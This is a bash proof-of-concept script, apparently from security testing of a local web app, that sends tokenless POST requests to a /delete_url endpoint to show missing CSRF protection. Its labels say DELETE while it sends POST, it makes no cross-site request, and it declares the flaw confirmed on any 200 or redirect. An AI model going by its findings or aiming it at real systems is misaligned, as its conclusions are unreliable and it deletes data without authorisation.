#!/bin/bash

# POC: Missing CSRF Protection on DELETE_URL Endpoint (v2)
# This script demonstrates that the /delete_url/{id} endpoint accepts DELETE
# requests without any CSRF token validation, allowing unauthorized deletions.

TARGET_URL="http://localhost:5003"

echo "=== CSRF Protection Vulnerability POC ==="
echo ""

# Step 1: First, let's get the homepage to see if there are any URLs to delete
echo "[*] Step 1: Fetching homepage to check existing URLs..."
HOMEPAGE=$(curl -s "${TARGET_URL}/")

# Try to extract an existing URL ID from the homepage
URL_ID=$(echo "$HOMEPAGE" | grep -oP 'delete_url/\K[0-9]+' | head -1)

if [ -z "$URL_ID" ]; then
  echo "[*] No existing URLs found. Let's try to add one first..."
  
  # Try to add a test URL
  echo "[*] Creating a test URL to delete..."
  ADD_RESPONSE=$(curl -X POST \
    "${TARGET_URL}/add_url" \
    -d "url=https://test-csrf-poc.example.com&description=Test+CSRF+POC" \
    -i \
    -s \
    -L)
  
  echo "[*] Add URL Response: $ADD_RESPONSE"
  
  # Try to extract the new URL ID from response or redirect
  URL_ID=$(echo "$ADD_RESPONSE" | grep -oP 'delete_url/\K[0-9]+' | head -1)
  
  if [ -z "$URL_ID" ]; then
    # If we can't find the ID, try ID 1 as default
    URL_ID=1
    echo "[*] Using default URL ID: $URL_ID"
  else
    echo "[+] New URL created with ID: $URL_ID"
  fi
else
  echo "[+] Found existing URL ID: $URL_ID"
fi

echo ""

# Step 2: Now attempt to DELETE the URL without CSRF token
echo "[*] Step 2: Attempting to DELETE URL ID $URL_ID without CSRF token..."
echo "[*] Request: POST ${TARGET_URL}/delete_url/${URL_ID}"
echo ""

DELETE_RESPONSE=$(curl -X POST \
  "${TARGET_URL}/delete_url/${URL_ID}" \
  -i \
  -s \
  -L)

echo "[*] Response:"
echo "$DELETE_RESPONSE"
echo ""

# Step 3: Verify the result
if echo "$DELETE_RESPONSE" | grep -qi "deleted\|redirect\|302\|303"; then
  echo "[+] SUCCESS: URL was deleted without CSRF token validation!"
  echo "[+] VULNERABILITY CONFIRMED: No CSRF protection on DELETE endpoint"
  exit 0
else
  # Check HTTP status code
  HTTP_CODE=$(curl -X POST \
    "${TARGET_URL}/delete_url/${URL_ID}" \
    -o /dev/null \
    -s \
    -w "%{http_code}")
  
  if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "303" ]; then
    echo "[+] HTTP Status $HTTP_CODE (Redirect): DELETE endpoint accepted request without CSRF token"
    echo "[+] VULNERABILITY CONFIRMED: No CSRF protection detected"
    exit 0
  elif [ "$HTTP_CODE" = "200" ]; then
    echo "[+] HTTP Status 200 (OK): DELETE endpoint accepted request without CSRF token"
    echo "[+] VULNERABILITY CONFIRMED: No CSRF protection detected"
    exit 0
  else
    echo "[-] Unexpected HTTP status: $HTTP_CODE"
    exit 1
  fi
fi